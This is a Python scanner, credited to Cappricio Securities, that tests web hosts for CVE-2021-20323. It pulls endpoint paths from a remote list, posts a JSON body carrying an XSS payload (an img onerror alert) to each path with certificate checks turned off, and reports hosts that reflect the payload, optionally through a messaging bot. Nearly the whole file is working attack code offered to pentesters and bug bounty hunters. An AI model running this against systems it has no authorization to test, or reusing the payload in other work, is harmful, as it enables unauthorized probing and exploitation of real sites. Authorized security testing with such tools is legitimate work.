#!/usr/bin/env python

"""
 * CVE-2021-20323
 * CVE-2021-20323 Bug scanner for WebPentesters and Bugbounty Hunters
 *
 * @Developed By Cappricio Securities <https://cappriciosec.com>
 */
 
"""
import requests
from urllib3.exceptions import InsecureRequestWarning
from urllib.parse import quote
from cve.includes import writefile
from cve.utils import const
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
from cve.utils import const
from cve.utils import configure
from cve.includes import bot

header = {
    "Content-Type": "application/json",
}

xss = "{\"cappriciosec.com<img src=x onerror=alert(document.domain)>\":1}"


def cvescan(url, output):
    try:
        with requests.Session() as session:
            payreq = session.get(const.Data.payloadurl)
            for endpoint in payreq.text.splitlines():
                encode = quote(endpoint)
                fullurl = f'{url}{encode}'
                try:
                    response = session.post(
                        fullurl, data=xss, headers=header, verify=False, timeout=5)
                    print(f'testing ===> {fullurl}')
                    if response.status_code == 400:
                        if f'Unrecognized field "cappriciosec.com<img src=x onerror=alert(document.domain)>"' in response.text and 'text/html' in response.headers.get('Content-Type', ''):
                            outputprint = (
                                f"\n{const.Colors.RED}💸[Vulnerable]{const.Colors.RESET} ======> "
                                f"{const.Colors.BLUE}{url}{const.Colors.RESET} \n"
                                f"{const.Colors.MAGENTA}📸PoC-Url->{const.Colors.BLUE}${const.Colors.RESET} {fullurl}\n\n\n"
                            )
                            print(outputprint)
                            if configure.check_id() == "Exist":
                                bot.sendmessage(fullurl)
                            if output is not None:
                                writefile.writedata(
                                    output, str(f'{fullurl}\n'))
                            break
                except requests.exceptions.RequestException as e:
                    print(
                        f'{const.Colors.MAGENTA}Invalid Domain ->{const.Colors.BLUE}${const.Colors.RESET} {fullurl}: {e}')
    except requests.exceptions.RequestException as e:
        print(f"Check Network Connection: {e}")



